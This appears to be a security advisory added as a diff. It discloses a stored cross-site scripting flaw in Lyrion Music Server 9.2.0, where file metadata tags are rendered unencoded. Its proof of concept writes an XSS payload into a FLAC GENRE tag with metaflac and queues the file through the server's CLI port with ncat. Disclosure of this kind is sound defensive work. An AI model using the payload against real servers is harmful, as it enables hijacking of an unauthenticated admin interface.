@@ -1,0 +1,76 @@
+
+Lyrion Music Server 9.2.0 (metadata) Stored XSS
+
+
+Vendor: LMS Community
+Product web page: https://www.lyrion.org
+Affected version 9.2.0
+
+Summary: Lyrion Music Server (formerly Logitech Media Server, and
+often abbreviated as "LMS" ) is open-source software which can control
+and serve (stream) music to a wide range of physical and virtual audio
+players called Squeezeboxes. Lyrion Music Server can stream your local
+music collection, internet radio stations, and content from many streaming
+services (with and without subscriptions).
+
+Desc: Lyrion Music Server stores media file metadata tags (such as GENRE,
+ARTIST, and ALBUM) exactly as written in the file and later renders them
+in its web interface without HTML-encoding, resulting in stored cross-site
+scripting. An attacker who gets a file with a malicious tag into the victim's
+library has their payload saved during the next library scan and executed
+automatically whenever a user views that track's information or plays the
+file in the web UI. Because LMS is unauthenticated by default, the injected
+script runs with full access to the management interface, allowing admin
+commands, settings disclosure, and further exploitation.
+
+Tested on: Windows 10 (64-bit) - EN
+           Lyrion Music Server (9.2.0 - 1779973211)
+           Perl/5.32.1
+           SQLite
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5990
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-5990
+CVE ID: CVE-2026-50232
+CVE URL: https://www.cve.org/CVERecord?id=CVE-2026-50232
+
+
+27.05.2026
+
+--
+
+
+$ metaflac --set-tag=GENRE="<img src=1 onerror=alert(document.cookie)>" evil.flac
+$ metaflac --list evil.flac
+METADATA block #0
+  type: 0 (STREAMINFO)
+  is last: false
+  length: 34
+  minimum blocksize: 4608 samples
+  maximum blocksize: 4608 samples
+  minimum framesize: 2305 bytes
+  maximum framesize: 14124 bytes
+  sample_rate: 44100 Hz
+  channels: 2
+  bits-per-sample: 16
+  total samples: 4664587
+  MD5 signature: 2aeee69c0153cb652c718dfdf0e9ff2d
+METADATA block #1
+  type: 4 (VORBIS_COMMENT)
+  is last: false
+  length: 98
+  vendor string: Lavf57.83.100
+  comments: 2
+    comment[0]: encoder=Lavf57.83.100
+    comment[1]: GENRE=<img src=1 onerror=alert(document.cookie)>
+METADATA block #2
+  type: 1 (PADDING)
+  is last: true
+  length: 8140
+
+$ ncat localhost 9090
+playlist add file:///music/evil.flac
